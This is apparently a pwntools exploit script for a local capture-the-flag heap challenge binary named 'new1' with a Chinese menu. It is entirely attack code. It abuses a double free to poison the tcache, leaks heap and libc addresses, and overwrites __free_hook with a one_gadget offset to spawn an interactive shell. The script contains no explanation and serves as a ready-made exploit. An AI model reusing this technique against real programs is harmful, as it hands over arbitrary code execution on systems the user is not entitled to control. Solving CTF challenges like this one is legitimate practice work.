#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
#context.log_level='debug'
r = process('./new1')
elf=ELF('./new1')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

def add(size, content):
    r.recvuntil(":\n")
    r.sendline("1")
    r.recvuntil(":\n")
    r.sendline(str(size))
    r.recvuntil(":")
    r.send(content)


def edit(idx, content):
    r.recvuntil(":\n")
    r.sendline("2")
    r.recvuntil(":\n")
    r.sendline(str(idx))
    r.recvuntil(":\n")
    r.sendline(str(len(content)))
    r.recvuntil("内容\n")
    r.send(content)


def dele(idx):
    r.recvuntil(":\n")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))
def show():
    r.recvuntil(":\n")
    r.sendline("3")
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
free_got = elf.got['free']
#gdb.attach(r)
add(0x78,'a'*0x70)#0
dele(0)
edit(0,'a'*10)
dele(0)
show()
r.recvuntil('法诀内容: ')
heap=u64(r.recv(6).ljust(8, b"\x00"))-0xa0a0a000660
print(hex(heap))
add(0x78,p64(0x7777777777777777)*6)#1
edit(0,p64(heap))
#gdb.attach(r)
add(0x78,p64(0x7777777777777777)*6)#2
add(0x78,p64(0x7777777777777777)*8)#3
#r.interactive()
dele(3)
show()
r.recvuntil('法诀序号: 3\n')
r.recvuntil('法诀内容: ')
base=u64(r.recv(6).ljust(8,'\x00'))-0x3ebca0
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
sys = base+libc.sym["system"]
f_hook = base+libc.sym["__free_hook"]
ma=base+libc.sym["__malloc_hook"]
add(0x40,'\n')#3
add(0x10,'\n')#4
edit(5,p64(f_hook-8)*2)
add(0x40,p64(0)+p64(0x4f432+base))
dele(6)
delta=0x9e3779b9
r.interactive()
